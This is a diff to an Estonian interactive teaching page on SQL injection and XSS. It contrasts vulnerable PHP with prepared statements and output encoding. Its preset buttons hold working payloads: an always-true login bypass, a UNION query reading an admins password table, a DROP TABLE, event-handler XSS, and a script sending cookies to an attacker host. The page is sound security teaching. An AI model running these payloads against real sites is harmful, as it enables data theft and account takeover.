@@ -26,6 +26,12 @@ button:hover{background:var(--card)}
 .u-code{background:var(--code-bg);color:var(--code);border-radius:3px;outline:1px solid var(--code-line)}
 .cmt{color:var(--muted);text-decoration:line-through}
 .q{background:var(--accent-bg);color:var(--accent);border-radius:3px;padding:0 4px}
+.expl{border-left:3px solid var(--accent);border-radius:0;padding:.6rem 1rem;margin:0 0 1.25rem;background:var(--card);font-size:15px}
+.expl strong{font-weight:600}
+.expl code{font-family:var(--mono);font-size:.9em}
+.intro p{margin:.5rem 0}
+kbd,.mono-in{font-family:var(--mono);font-size:.92em;background:var(--card);padding:0 4px;border-radius:4px}
+.why{font-size:15px;margin:0 0 1rem}
 .legend{display:flex;gap:16px;font-size:13px;color:var(--muted);flex-wrap:wrap}
 .browser{background:var(--bg);border:1px solid var(--border);border-radius:8px;overflow:hidden}
 .browser .bar{font-size:12px;color:var(--muted);padding:4px 10px;border-bottom:1px solid var(--border)}
@@ -35,14 +41,29 @@ button:hover{background:var(--card)}
 </head>
 <body>
 <h1>Veebirünnakud: proovi ise</h1>
-<nav><a href="https://github.com/valdonolvak/Operatsioonis-steemi-ja-k-berturbe-alused/blob/main/peatykid/24-kuberturbe-pohimoisted.md#xss">← Peatükk 24</a><a href="#sqli">SQL-süst</a><a href="#xss">XSS</a></nav>
-<p>Mõlemal rünnakul on sama põhjus: <strong>kasutaja sisend kleebitakse teksti sisse, mida keegi teine (andmebaas või brauser) tõlgendab koodina.</strong> Vali näide või kirjuta oma sisend.</p>
+<nav><a href="https://github.com/valdonolvak/Operatsioonis-steemi-ja-k-berturbe-alused/blob/main/peatykid/24-kuberturbe-pohimoisted.md">← Peatükk 24</a><a href="#sqli">SQL-süst</a><a href="#xss">XSS</a></nav>
+<div class="intro">
+<p>SQL-süst ja XSS on kaks levinumat veebirakenduste nõrkust. Mõlemal on sama põhjus: <strong>programm kleebib kasutaja sisendi teksti sisse, mida keegi teine tõlgendab koodina.</strong> SQL-süsti puhul on see tõlgendaja andmebaas, XSS-i puhul brauser.</p>
+<p>Iga näite juures on kaks paneeli. Ülemine näitab ohtlikku koodi, mis sisendi lihtsalt kokku kleebib. Alumine näitab turvalist koodi, mis hoiab sisendi koodist eraldi. Vali näidisnupp või kirjuta väljale oma tekst. Mõlemad paneelid ja selgituskast uuenevad iga tähe järel.</p>
+<p>Värvid näitavad, mis sinu sisendist sai:</p>
+</div>
+<div class="legend" style="margin-bottom:.5rem">
+  <span><span class="u-data" style="padding:0 6px">abc</span> sisend jäi andmeks (tekst, nimi, kommentaar)</span>
+  <span><span class="u-code" style="padding:0 6px">abc</span> sisend muutus koodiks, mida täidetakse</span>
+  <span><span class="cmt">abc</span> välja kommenteeritud, ei loeta</span>
+</div>
 
 <!-- ============ SQL INJECTION ============ -->
 <h2 id="sqli">1. SQL-süst</h2>
+<div class="intro">
+<p>Kujuta ette veebilehte, kus saab otsida kasutajat nime järgi. Nimi tuleb aadressiribalt, näiteks <span class="mono-in">otsi.php?nimi=mari</span>, ja PHP paneb selle andmebaasipäringusse.</p>
+<p>Ohtlik kood ehitab päringu kolmest tükist: programmeerija tekst kuni avava ülakomani, kasutaja sisend ja sulgev ülakoma. Andmebaas saab ühe valmis teksti ega tea, kus kasutaja osa algas ja lõppes. SQL-is tähistab ülakoma <span class="mono-in">'</span> stringi algust ja lõppu. Kui kasutaja kirjutab ülakoma, saab ta stringi ise sulgeda ja kõik järgnev on andmebaasi jaoks käsk.</p>
+<p><strong>Mida proovida:</strong> alusta nimest <span class="mono-in">mari</span>, siis lisa selle lõppu üks ülakoma ja vaata, kuidas värvid muutuvad.</p>
+</div>
 <p class="lbl">Kasutaja sisend ($_GET['nimi'])</p>
 <input id="sql-inp" type="text" value="' OR '1'='1" aria-label="SQL-näite sisend">
 <div class="presets" id="sql-presets"></div>
+<div class="expl" id="sql-expl" aria-live="polite"></div>
 
 <div class="panel">
   <p class="lbl">⚠ Ohtlik: string kleebitakse kokku, andmebaas saab ühe teksti</p>
@@ -62,12 +83,19 @@ $stmt->execute([$_GET['nimi']]);</div>
   <div class="mono"><span class="u-data" id="sql-good" style="padding:2px 6px"></span></div>
   <p class="verdict" style="color:var(--ok)">✓ Andmebaas otsib kasutajat, kelle nimi on täpselt see tekst. Ülakomad on tavalised märgid.</p>
 </div>
+<p class="why"><strong>Miks turvaline kood töötab?</strong> Päring jõuab andmebaasi kahes osas. <span class="mono-in">prepare()</span> saadab päringu kuju koos kohahoidjaga <span class="mono-in">?</span>, ja andmebaas parsib selle kohe valmis. <span class="mono-in">execute()</span> saadab väärtuse hiljem, eraldi paketis. Väärtus pannakse <span class="mono-in">?</span> kohale andmena ja seda ei parsita enam SQL-ina. Kasutaja ei saa seega päringu kuju muuta, olgu sisendis mis tahes märgid. Ülakomade „puhastamine“ (<span class="mono-in">addslashes()</span>) ei ole sama kindel: numbriväljas, näiteks <span class="mono-in">WHERE id = 1 OR 1=1</span>, pole ülakoma vajagi.</p>
 
 <!-- ============ XSS ============ -->
 <h2 id="xss">2. XSS (cross-site scripting)</h2>
+<div class="intro">
+<p>Nüüd on tegemist kommentaaridega lehega. Kasutaja kirjutab kommentaari, see salvestatakse andmebaasi ja kõik järgmised külastajad näevad seda. Ohtlik kood paneb kommentaari muutmata kujul <span class="mono-in">&lt;p&gt;</span> sildi sisse.</p>
+<p>Viga on sama mis SQL-süstil, ainult tõlgendaja on teine. HTML-is tähistab märk <span class="mono-in">&lt;</span> sildi algust. Kui kommentaaris on <span class="mono-in">&lt;</span>, loeb brauser selle sildina. Kui sildis on JavaScript, käivitub see <strong>iga lugeja brauseris</strong> ja töötab lehe nimel: näeb küpsiseid, lehe sisu ja saab teha toiminguid kasutaja nimel.</p>
+<p>Valgel taustal kast näitab, mida teine kasutaja ekraanil näeb. Selles näites on skriptid blokeeritud, nii et midagi päriselt ei käivitu. Selgituskast ütleb, mida päris leht oleks teinud.</p>
+</div>
 <p class="lbl">Kasutaja kommentaar ($_POST['kommentaar'])</p>
 <input id="xss-inp" type="text" value="<img src=x onerror=alert(document.cookie)>" aria-label="XSS-näite sisend">
 <div class="presets" id="xss-presets"></div>
+<div class="expl" id="xss-expl" aria-live="polite"></div>
 
 <div class="panel">
   <p class="lbl">⚠ Ohtlik: kommentaar kleebitakse HTML-i sisse</p>
@@ -88,17 +116,28 @@ $stmt->execute([$_GET['nimi']]);</div>
   <div class="browser"><div class="bar">teine kasutaja vaatab kommentaare</div><iframe id="xss-good-view" sandbox="" title="Turvalise väljundi eelvaade"></iframe></div>
   <p class="verdict" style="color:var(--ok)">✓ &lt; ja &gt; muutusid &amp;lt; ja &amp;gt; märkideks. Brauser näitab neid tekstina, mitte ei loe neid sildina.</p>
 </div>
+<p class="why"><strong>Miks turvaline kood töötab?</strong> <span class="mono-in">htmlspecialchars()</span> asendab HTML-i erimärgid olemitega: <span class="mono-in">&lt;</span> → <span class="mono-in">&amp;lt;</span>, <span class="mono-in">&gt;</span> → <span class="mono-in">&amp;gt;</span>, <span class="mono-in">"</span> → <span class="mono-in">&amp;quot;</span>, <span class="mono-in">'</span> → <span class="mono-in">&amp;#039;</span> ja <span class="mono-in">&amp;</span> → <span class="mono-in">&amp;amp;</span>. Brauser joonistab olemi ekraanile märgina, kuid ei alusta sellega silti. Põhimõte on sama mis parameetritega päringul: sisend jääb andmeks. Kodeeri väljastamisel, mitte salvestamisel. Lisakaitsena keelab <span class="mono-in">Content-Security-Policy</span> päis lehe sisse süstitud skriptid ja <span class="mono-in">HttpOnly</span> lipp peidab seansiküpsise JavaScripti eest.</p>
 
-<div class="legend">
-  <span><span class="u-data" style="padding:0 6px">abc</span> sisend jäi andmeks</span>
-  <span><span class="u-code" style="padding:0 6px">abc</span> sisend muutus koodiks</span>
-  <span><span class="cmt">abc</span> välja kommenteeritud</span>
-</div>
 
 <script>
 const esc=s=>s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 function presets(id,list,inp,fn){const el=document.getElementById(id);list.forEach(p=>{const b=document.createElement('button');b.textContent=p;b.onclick=()=>{inp.value=p;fn()};el.appendChild(b)})}
 
+const SQL_EXPL={
+ "mari":"<strong>Tavaline nimi.</strong> Ülakomasid pole, nii et sisend jääb programmeerija ülakomade vahele ja on andmed. Ohtlik kood töötab siin õigesti. Just seepärast jääb viga tavalisel testimisel sageli märkamata.",
+ "' OR '1'='1":"<strong>Alati tõene tingimus.</strong> Sisendi esimene ülakoma sulgeb programmeerija avatud stringi, mis jääb tühjaks. <code>OR '1'='1'</code> on nüüd tingimuse osa ja 1 võrdub alati 1-ga, seega sobib iga rida. Viimast ülakoma pole sisendis vaja, sest programm lisab selle ise. Sisselogimisvormis tähendab see sageli sisselogimist ilma paroolita.",
+ "' UNION SELECT kasutaja, parool FROM admins -- ":"<strong>Teise tabeli lugemine.</strong> <code>UNION</code> liidab esimese päringu tulemusele teise päringu tulemuse, nii et leht näitab andmeid tabelist, mida see kunagi näitama ei pidanud. <code>--</code> alustab SQL-is kommentaari, seega programmi lisatud viimane ülakoma ei tekita süntaksiviga. Päris rünnakus peab veergude arv klappima, ja ründaja leiab selle katsetades.",
+ "O'Brien":"<strong>Aus kasutaja, sama viga.</strong> Rünnet pole, aga nimes olev ülakoma sulgeb stringi enneaegu ja <code>Brien'</code> jääb andmebaasile arusaamatuks. Päring katkeb. Kui leht näitab seepeale andmebaasi veateadet, saab ründaja teada, et sisend jõuab päringusse muutmata. See on sageli rünnaku esimene samm.",
+ "'; DROP TABLE users; -- ":"<strong>Uus käsk.</strong> Semikoolon lõpetab esimese käsu ja alustab teist. Kas teine käsk käivitub, sõltub andmebaasist ja ühenduse seadistusest: paljud ühendused lubavad korraga ainult ühte käsku. See ei päästa, sest <code>OR</code> ja <code>UNION</code> töötavad ühe käsu sees."
+};
+const XSS_EXPL={
+ "Tore artikkel!":"<strong>Tavaline tekst.</strong> Märki <code>&lt;</code> pole, seega jääb kõik tekstiks ja ohtlik kood töötab õigesti.",
+ "<b>väga</b> tore":"<strong>Sisend muudab lehe HTML-i.</strong> Brauser loeb <code>&lt;b&gt;</code> sildina ja kuvab sõna paksus kirjas. Kahju pole, aga see tõestab, et kommentaar saab lehe ülesehitust muuta. Kui saab lisada <code>&lt;b&gt;</code>, saab lisada ka <code>&lt;script&gt;</code>.",
+ "<script>fetch('https://ryndaja.ee/?c='+document.cookie)<\/script>":"<strong>Seansiküpsise vargus.</strong> Iga lugeja brauser käivitab skripti, sest see on lehe enda HTML-is. <code>document.cookie</code> loeb lehe küpsised ja <code>fetch</code> saadab need ründaja serverisse. Seansiküpsisega pääseb ründaja ohvri kontosse ilma parooli ja MFA-ta, sest ohver on juba sisse loginud. Kui küpsisel on <code>HttpOnly</code> lipp, ei näe <code>document.cookie</code> seda.",
+ "<img src=x onerror=alert(document.cookie)>":"<strong>Skript ilma sõnata „script“.</strong> Pilti <code>x</code> ei leita, brauser käivitab sündmuse <code>onerror</code> ja selles oleva JavaScripti. Seetõttu ei aita sõnade keelamine: HTML-is on kümneid sündmusi (<code>onload</code>, <code>onmouseover</code>, <code>onfocus</code> jt), mis käivitavad koodi.",
+ "<a href=\"javascript:alert(1)\">Vajuta siia</a>":"<strong>Kood lingis.</strong> Aadress <code>javascript:</code> käivitab koodi, kui kasutaja lingile klõpsab. Siin aitab <code>htmlspecialchars()</code>, sest sisendis on <code>&lt;</code>. Kui aga programm paneb kasutaja antud URL-i ise <code>href</code> atribuuti, pole kodeerida midagi. Siis tuleb kontrollida, et aadress algab <code>https://</code>-ga."
+};
+function setExpl(id,html){document.getElementById(id).innerHTML=html}
 /* ---- SQL ---- */
 const sqlInp=document.getElementById('sql-inp');
 function runSql(){
@@ -126,6 +165,11 @@ function runSql(){
   else if(codeUsed){v.style.color='var(--bad)';v.textContent='✗ Punane osa ei ole enam nimi. Andmebaas täidab selle SQL-käsuna.'}
   else{v.style.color='var(--ok)';v.textContent='✓ Seekord läks hästi, sest sisendis polnud ülakoma.'}
   document.getElementById('sql-good').textContent=u===''?' ':u;
+  if(SQL_EXPL[u]!==undefined)setExpl('sql-expl',SQL_EXPL[u]);
+  else if(u==='')setExpl('sql-expl','Kirjuta väljale nimi või vali näide.');
+  else if(inStr&&!cm)setExpl('sql-expl','<strong>Paaritu ülakoma.</strong> Sinu sisendis on ülakoma, mis sulgeb või avab stringi valest kohast, ja päring katkeb süntaksiveaga. Proovi lisada lõppu <code>OR \'1\'=\'1</code>, et päring jälle kehtiks.');
+  else if(codeUsed)setExpl('sql-expl','<strong>Sinu sisendist sai SQL-i osa.</strong> Punasega märgitud märgid on väljaspool programmeerija ülakomasid, seega loeb andmebaas neid käsuna, mitte nimena. Alumises paneelis on sama tekst ainult andmed.');
+  else setExpl('sql-expl','<strong>Sisend jäi andmeks.</strong> Ülakomasid pole, seega on kogu tekst stringi sees. Proovi lisada ülakoma <code>\'</code>.');
 }
 presets('sql-presets',["mari","' OR '1'='1","' UNION SELECT kasutaja, parool FROM admins -- ","O'Brien","'; DROP TABLE users; -- "],sqlInp,runSql);
 sqlInp.addEventListener('input',runSql);runSql();
@@ -150,6 +194,11 @@ function runXss(){
   const enc=hsc(u);
   document.getElementById('xss-good').innerHTML='&lt;p&gt;<span class="u-data">'+esc(enc)+'</span>&lt;/p&gt;';
   document.getElementById('xss-good-view').srcdoc=frameDoc('<p>'+enc+'</p>');
+  if(XSS_EXPL[u]!==undefined)setExpl('xss-expl',XSS_EXPL[u]);
+  else if(u==='')setExpl('xss-expl','Kirjuta kommentaar või vali näide.');
+  else if(m)setExpl('xss-expl','<strong>Sinu kommentaar sisaldab käivitatavat koodi.</strong> Ohtlik leht annaks selle iga lugeja brauserile ja brauser käivitaks selle lehe nimel. Alumises paneelis on samad märgid kodeeritud ja kuvatakse tekstina.');
+  else if(tags)setExpl('xss-expl','<strong>Sinu kommentaar muutis lehe HTML-i.</strong> Punasega märgitud osa loeb brauser sildiks. Skripti pole, aga kui sildi saab lisada, saab lisada ka skripti.');
+  else setExpl('xss-expl','<strong>Sisend jäi tekstiks.</strong> Märki <code>&lt;</code> pole. Proovi kirjutada <code>&lt;b&gt;tere&lt;/b&gt;</code>.');
 }
 presets('xss-presets',["Tore artikkel!","<b>väga</b> tore","<script>fetch('https://ryndaja.ee/?c='+document.cookie)<\/script>","<img src=x onerror=alert(document.cookie)>","<a href=\"javascript:alert(1)\">Vajuta siia</a>"],xssInp,runXss);
 xssInp.addEventListener('input',runXss);runXss();
